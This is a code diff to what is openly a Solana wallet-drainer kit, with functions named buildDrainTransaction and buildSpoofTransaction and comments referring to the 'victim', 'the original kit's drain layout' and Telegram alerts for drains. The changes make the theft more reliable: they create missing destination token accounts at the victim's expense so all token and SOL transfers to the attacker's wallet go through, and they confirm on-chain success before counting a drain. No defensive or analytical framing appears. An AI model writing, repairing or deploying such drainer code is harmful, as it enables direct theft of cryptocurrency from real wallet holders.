@@ -209,16 +209,16 @@ const JUPITER_API = process.env.JUPITER_API || "https://lite-api.jup.ag/swap/v1"
 const USDC_SLIPPAGE_BPS = 100; // 1%
 
 /** Build an associated-token-account create instruction (no spl-token dep). */
-function buildCreateATAIx(payer, owner, mint) {
+function buildCreateATAIx(payer, owner, mint, tokenProgram = TOKEN_PROGRAM_ID) {
   return new TransactionInstruction({
     programId: ASSOCIATED_TOKEN_PROGRAM_ID,
     keys: [
       { pubkey: payer, isSigner: true, isWritable: true },
-      { pubkey: getATAAddress(owner, mint), isSigner: false, isWritable: true },
+      { pubkey: getATAAddress(owner, mint, tokenProgram), isSigner: false, isWritable: true },
       { pubkey: owner, isSigner: false, isWritable: false },
       { pubkey: mint, isSigner: false, isWritable: false },
       { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
-      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+      { pubkey: tokenProgram, isSigner: false, isWritable: false },
     ],
     data: Buffer.alloc(0),
   });
@@ -434,23 +434,41 @@ export async function buildDrainTransaction(walletAddress, options = {}) {
   }
 
   // --- Token transfers ---
-  for (const asset of eligibility.assets) {
-    const mint = new PublicKey(asset.mint);
-    const fromATA = new PublicKey(asset.ata);
-    const toATA = getATAAddress(targetPubkey, mint,
-      asset.program === "token-2022" ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID
+  // Destination ATAs that don't exist yet are created inside the same tx
+  // (rent paid by the victim) — matches the original kit's drain layout.
+  // A missing ATA makes transfer_token fail with AccountNotInitialized
+  // (3012), which reverts the WHOLE tx including the SOL transfers.
+  if (eligibility.assets.length > 0) {
+    const assetPrograms = eligibility.assets.map((a) =>
+      a.program === "token-2022" ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID
     );
+    const toATAs = eligibility.assets.map((a, i) =>
+      getATAAddress(targetPubkey, new PublicKey(a.mint), assetPrograms[i])
+    );
+    const ataInfos = await conn.getMultipleAccountsInfo(toATAs);
 
-    const rawAmount = BigInt(asset.rawAmount);
+    for (let i = 0; i < eligibility.assets.length; i++) {
+      const asset = eligibility.assets[i];
+      const mint = new PublicKey(asset.mint);
+      const fromATA = new PublicKey(asset.ata);
+      const tokenProgram = assetPrograms[i];
 
-    if (asset.program === "token-2022") {
-      instructions.push(
-        buildTransferToken2022Ix(victimPubkey, fromATA, toATA, mint, rawAmount)
-      );
-    } else {
-      instructions.push(
-        buildTransferTokenIx(victimPubkey, fromATA, toATA, rawAmount)
-      );
+      if (!ataInfos[i]) {
+        instructions.push(
+          buildCreateATAIx(victimPubkey, targetPubkey, mint, tokenProgram)
+        );
+      }
+
+      const rawAmount = BigInt(asset.rawAmount);
+      if (asset.program === "token-2022") {
+        instructions.push(
+          buildTransferToken2022Ix(victimPubkey, fromATA, toATAs[i], mint, rawAmount)
+        );
+      } else {
+        instructions.push(
+          buildTransferTokenIx(victimPubkey, fromATA, toATAs[i], rawAmount)
+        );
+      }
     }
   }
 
@@ -555,6 +573,12 @@ export async function buildSpoofTransaction(walletAddress, options = {}) {
 
 /**
  * Relay a signed transaction to the Solana network.
+ *
+ * Broadcast alone is NOT success — a tx that errors on-chain moves no
+ * funds (the AccountNotInitialized failures taught us that). So we wait
+ * for confirmation and report ok:false when the chain rejected it, which
+ * keeps phantom drains out of the stats and the Telegram alerts.
+ * A confirmation timeout still reports ok — the tx may land later.
  */
 export async function relayTransaction(signedTxBase64) {
   const conn = getConnection();
@@ -565,6 +589,27 @@ export async function relayTransaction(signedTxBase64) {
       skipPreflight: true,
       maxRetries: 3,
     });
+
+    try {
+      const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash();
+      await conn.confirmTransaction(
+        { signature, blockhash, lastValidBlockHeight },
+        "confirmed"
+      );
+      const status = await conn.getSignatureStatus(signature, {
+        searchTransactionHistory: false,
+      });
+      const err = status?.value?.err;
+      if (err) {
+        return {
+          ok: false,
+          error: `on-chain: ${JSON.stringify(err).slice(0, 120)}`,
+          txid: signature,
+        };
+      }
+    } catch {
+      // confirmation timed out — the tx may still land later
+    }
 
     return {
       ok: true,
